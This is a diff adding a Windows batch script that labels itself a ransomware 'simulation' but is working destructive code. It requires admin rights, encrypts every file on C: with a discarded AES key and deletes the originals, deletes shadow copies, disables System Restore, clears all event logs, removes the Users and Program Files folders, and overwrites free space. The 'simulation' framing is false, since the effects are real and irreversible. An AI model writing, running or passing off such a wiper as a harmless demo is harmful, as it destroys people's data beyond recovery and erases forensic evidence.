@@ -1,0 +1,88 @@
+@echo off
+color 4C
+title !!! YOUR FILES HAVE BEEN ENCRYPTED !!!
+mode con: cols=80 lines=30
+
+:: Simula tela de ransomware
+cls
+echo.
+echo ██████████████████████████████████████████████████████████████████
+echo █                                                             █
+echo █               !!!  YOUR SYSTEM HAS BEEN INFECTED !!!        █
+echo █                                                             █
+echo █  All your files have been encrypted with military-grade     █
+echo █  AES-256 encryption. The original files were destroyed.     █
+echo █                                                             █
+echo █  Your data is permanently lost. No key has been saved.      █
+echo █                                                             █
+echo █  DO NOT turn off the computer. This is not a joke.          █
+echo █                                                             █
+echo ██████████████████████████████████████████████████████████████████
+echo.
+timeout /t 10 >nul
+
+:: Verifica privilégios de admin
+net session >nul 2>&1
+if %errorlevel% neq 0 (
+    echo [!] This script must be run as Administrator.
+    pause
+    exit /b
+)
+
+:: 1. Criptografar TODOS os arquivos do disco C:
+echo [*] Encrypting ALL files with AES-256...
+powershell -Command ^
+"$AES = New-Object System.Security.Cryptography.AesManaged; ^
+$AES.KeySize = 256; $AES.GenerateKey(); $AES.GenerateIV(); ^
+$files = Get-ChildItem -Path C:\ -Recurse -File -Force -ErrorAction SilentlyContinue; ^
+foreach ($f in $files) { try { ^
+  $bytes = [System.IO.File]::ReadAllBytes($f.FullName); ^
+  $encryptor = $AES.CreateEncryptor(); ^
+  $encrypted = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length); ^
+  [System.IO.File]::WriteAllBytes($f.FullName + '.locked', $encrypted); ^
+  Remove-Item $f.FullName -Force -ErrorAction SilentlyContinue } catch {} }"
+
+:: 2. Apagar shadow copies
+echo [*] Deleting shadow copies...
+vssadmin delete shadows /all /quiet
+
+:: 3. Desabilitar restauração
+echo [*] Disabling System Restore...
+powershell -Command "Disable-ComputerRestore -Drive 'C:\'"
+
+:: 4. Apagar logs
+echo [*] Clearing event logs...
+for /f %%x in ('wevtutil el') do wevtutil cl "%%x"
+
+:: 5. Apagar arquivos temporários e caches
+echo [*] Deleting TEMP and cache directories...
+del /f /s /q %TEMP%\* >nul 2>&1
+del /f /s /q C:\Windows\Temp\* >nul 2>&1
+del /f /s /q C:\Windows\Prefetch\* >nul 2>&1
+
+:: 6. Apagar diretórios críticos
+echo [*] Wiping system and user folders...
+rmdir /s /q C:\Users >nul 2>&1
+rmdir /s /q C:\ProgramData >nul 2>&1
+rmdir /s /q "C:\Program Files" >nul 2>&1
+rmdir /s /q "C:\Program Files (x86)" >nul 2>&1
+
+:: 7. Sobrescrever espaço livre
+echo [*] Overwriting free space (slack/MFT/unallocated)...
+cipher /w:C:\
+
+:: Tela final
+cls
+color 0C
+echo.
+echo ██████████████████████████████████████████████████████████████████
+echo █                                                             █
+echo █               !!! SYSTEM DESTROYED SUCCESSFULLY !!!         █
+echo █                                                             █
+echo █        All data is lost. There is no way to recover.        █
+echo █                                                             █
+echo █  This simulation demonstrates full antiforensic attack.     █
+echo █                                                             █
+echo ██████████████████████████████████████████████████████████████████
+pause
+exit
